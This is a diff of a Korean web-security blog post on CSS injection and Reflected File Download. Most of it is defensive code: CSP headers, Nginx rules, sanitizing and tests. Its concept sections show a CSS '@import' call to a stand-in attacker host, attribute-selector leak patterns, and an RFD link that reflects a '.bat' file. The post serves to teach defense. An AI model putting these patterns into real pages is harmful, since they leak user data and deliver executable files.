@@ -4,7 +4,8 @@ title: 웹해킹 - CSS Injection, RFD
 date: 2025-10-05 20:25:23 +0900
 category: 웹해킹
 ---
-# 14. CSS Injection / RFD(Reflected File Download)
+# CSS Injection / RFD(Reflected File Download)
+
 **— 개념 · 위험 벡터 · 안전 재현(차단이 정상) · 코드로 구현하는 방어(콘텐츠 타입 고정·`nosniff`·첨부 강제·CSP·Sanitize)**
 
 > ⚠️ **법·윤리 고지**
@@ -13,7 +14,7 @@ category: 웹해킹
 
 ---
 
-## 0. 한눈에 보기 (Executive Summary)
+## 한눈에 보기 (Executive Summary)
 
 - **CSS Injection**
   - **문제**: 사용자 입력이 **`<style>`/`style=`/CSS 값/선택자**에 주입되면,
@@ -37,16 +38,18 @@ category: 웹해킹
 
 ---
 
-# 1. CSS Injection — 원리와 벡터
+# CSS Injection — 원리와 벡터
 
-### 1.1 어디서 새나가나?
+### 어디서 새나가나?
+
 - **HTML 인라인 스타일**: `<div style="color:${user}">`
 - **스타일 태그/템플릿**: `<style>.card{background:${userColor}}</style>`
 - **CSS-in-JS 문자열 결합**: `` css`width:${user}px` ``
 - **선택자/속성명에 사용자 입력 사용**: `document.querySelector("#" + userId)`
 - **서드파티 위젯/리치 텍스트**가 **`style`/`<style>` 허용**
 
-### 1.2 정보 추정/유출 메커니즘(개념)
+### 정보 추정/유출 메커니즘(개념)
+
 - `@import url(https://attacker.tld/a);`, `background-image: url(https://…/?signal=1)`
 - `@font-face` + `unicode-range`로 **특정 문자의 존재/길이** 추정
 - 속성 선택자(ex. `[value^="A"]`) + **패턴 매칭**으로 값에 따라 **다른 외부 요청** 트리거
@@ -56,7 +59,7 @@ category: 웹해킹
 
 ---
 
-# 2. CSS Injection — “안전 재현(스테이징)” 시나리오
+# CSS Injection — “안전 재현(스테이징)” 시나리오
 
 > 목표: 보안 설정이 **제대로 막고 있는지** 확인(차단/무력화가 **정상**)
 
@@ -74,11 +77,13 @@ category: 웹해킹
 
 ---
 
-# 3. CSS Injection — 방어 레시피 (애플리케이션)
+# CSS Injection — 방어 레시피 (애플리케이션)
 
-## 3.1 CSP로 외부 요청 통제
+## CSP로 외부 요청 통제
+
 ```nginx
 # Nginx 예: 최소 권한 원칙
+
 add_header Content-Security-Policy "
   default-src 'self';
   style-src   'self' 'nonce-__RUNTIME_NONCE__';  # 인라인은 nonce로만
@@ -95,7 +100,8 @@ add_header Cross-Origin-Resource-Policy "same-origin" always;  # CORP
 > - 인라인 스타일이 꼭 필요하면 **`nonce`**를 사용하고, 문자열 결합 대신 **서버가 난수 nonce를 부여**.
 > - 외부 도메인 요청이 꼭 필요하면 **정확한 도메인만** 화이트리스트.
 
-## 3.2 DOM 조작 시 안전 API 사용
+## DOM 조작 시 안전 API 사용
+
 ```ts
 // ❌ 나쁜 예: 문자열 결합
 el.setAttribute("style", `width:${user}px; background:url(${avatar})`);
@@ -111,7 +117,8 @@ const safeId = CSS.escape(String(userId));
 document.querySelector(`#user-${safeId}`);
 ```
 
-## 3.3 리치 텍스트/템플릿 Sanitize
+## 리치 텍스트/템플릿 Sanitize
+
 - **원칙**: 사용자 HTML에서 **`<style>` 태그, `style` 속성, `@import`/`url()`**을 **금지**.
 ```js
 // DOMPurify 예
@@ -123,7 +130,8 @@ const clean = DOMPurify.sanitize(userHtml, {
 container.innerHTML = clean;
 ```
 
-## 3.4 서버에서 MIME 고정 + `nosniff`
+## 서버에서 MIME 고정 + `nosniff`
+
 ```js
 // Node/Express — 정적·동적 응답
 app.get("/assets/app.css", (req,res)=>{
@@ -141,20 +149,23 @@ app.get("/echo", (req,res)=>{
 });
 ```
 
-## 3.5 서드파티 CSS/SaaS 위젯
+## 서드파티 CSS/SaaS 위젯
+
 - **SRI**(Subresource Integrity) + **버전 고정**
 - 필요한 최소 스코프만(섀도우 DOM/iframe 샌드박스 활용 고려)
 
 ---
 
-# 4. RFD(Reflected File Download) — 원리와 위험
+# RFD(Reflected File Download) — 원리와 위험
 
-### 4.1 무엇이 문제인가
+### 무엇이 문제인가
+
 - URL 파라미터를 **파일명/내용**에 반사해서 브라우저에게 **다운로드** 시키는 엔드포인트가 있을 때,
   공격자는 **신뢰 도메인** 링크로 **실행형 확장자**(예: `.bat`, `.cmd`, `.ps1`, `.reg`, `.html`, `.hta`) **파일을 저장하게 유도**.
 - 일부 브라우저/OS 조합에서 파일 **내용의 선두 바이트**나 **확장자**를 근거로 **실행/경고 완화**가 발생할 수 있음.
 
-### 4.2 위험 시나리오(개념)
+### 위험 시나리오(개념)
+
 ```
 https://trusted.example.com/download?fn=invoice.bat&body=@echo off
 ```
@@ -163,7 +174,7 @@ https://trusted.example.com/download?fn=invoice.bat&body=@echo off
 
 ---
 
-# 5. RFD — “안전 재현(스테이징)” 시나리오
+# RFD — “안전 재현(스테이징)” 시나리오
 
 1) **실행 확장자 강제 실패**
    - `?fn=evil.bat` 요청 → 서버가 **`attachment`+화이트리스트 확장자**로 **`.txt`로 강제**되어야 정상.
@@ -174,9 +185,10 @@ https://trusted.example.com/download?fn=invoice.bat&body=@echo off
 
 ---
 
-# 6. RFD — 방어 레시피 (애플리케이션·프록시)
+# RFD — 방어 레시피 (애플리케이션·프록시)
 
-## 6.1 안전한 다운로드 엔드포인트
+## 안전한 다운로드 엔드포인트
+
 ```ts
 // Node/Express
 const SAFE_EXT = new Set([".txt",".csv",".json",".pdf",".zip"]); // 필요 최소
@@ -200,9 +212,11 @@ app.get("/download", (req,res)=>{
 });
 ```
 
-## 6.2 Nginx 레벨에서 강제
+## Nginx 레벨에서 강제
+
 ```nginx
 # 다운로드 경로는 항상 첨부
+
 location /download/ {
   add_header X-Content-Type-Options "nosniff" always;
   add_header Content-Disposition "attachment" always;
@@ -212,17 +226,19 @@ location /download/ {
 }
 ```
 
-## 6.3 업로드/서빙 파이프라인
+## 업로드/서빙 파이프라인
+
 - **서버 측 MIME 스니핑(매직넘버)** → 실제 유형과 확장자 불일치 시 **거부/정규화**
 - **서명 URL**(S3/GCS)로 **직접 다운로드** 유도, 앱 서버의 **반사형 다운로드 엔드포인트 제거**
 - **서빙 도메인 분리**(예: `dl.example`), `Content-Disposition: attachment` 기본값
 
 ---
 
-# 7. 종합 하드닝 — 헤더/정책 세트
+# 종합 하드닝 — 헤더/정책 세트
 
 ```nginx
 # 공통 보안 헤더
+
 add_header X-Content-Type-Options "nosniff" always;
 add_header Referrer-Policy "strict-origin-when-cross-origin" always;
 add_header X-Frame-Options "SAMEORIGIN" always;
@@ -236,12 +252,13 @@ add_header Content-Security-Policy "
 " always;
 
 # 민감 리소스: 교차 포함 자체 차단
+
 add_header Cross-Origin-Resource-Policy "same-origin" always;
 ```
 
 ---
 
-# 8. 개발·리뷰 체크 포인트
+# 개발·리뷰 체크 포인트
 
 - **템플릿**:
   - 절대 **사용자 입력을 `<style>`/`style=`/CSS 값/선택자**에 그대로 삽입하지 말 것.
@@ -262,13 +279,15 @@ add_header Cross-Origin-Resource-Policy "same-origin" always;
 
 ---
 
-# 9. 로깅·모니터링 & 테스트
+# 로깅·모니터링 & 테스트
 
-## 9.1 탐지 아이디어
+## 탐지 아이디어
+
 - **의심 CSS 로드**: `@import`/외부 `font-src`/특이 도메인 `img-src` 발생 시 경보
 - **다운로드 엔드포인트 남용**: 비정상 확장자 시도, 파일명 길이/문자 허용 초과
 
-## 9.2 자동 테스트 (Playwright 예)
+## 자동 테스트 (Playwright 예)
+
 ```ts
 test("외부 폰트/이미지 차단(CSP)", async ({ page }) => {
   const reqs: string[] = [];
@@ -291,7 +310,7 @@ test("다운로드는 attachment + 안전한 확장자", async ({ page }) => {
 
 ---
 
-# 10. 안티패턴(피해야 할 것)
+# 안티패턴(피해야 할 것)
 
 - 사용자 입력을 **그대로** `style=`/`<style>`/CSS 값/선택자에 삽입
 - **외부 CSS/폰트** 와일드카드 허용(`*`)
@@ -301,7 +320,7 @@ test("다운로드는 attachment + 안전한 확장자", async ({ page }) => {
 
 ---
 
-# 11. 체크리스트 (현장용)
+# 체크리스트 (현장용)
 
 - [ ] 모든 응답에 **`X-Content-Type-Options: nosniff`**
 - [ ] 정적/동적 **`Content-Type` 정확히 설정**
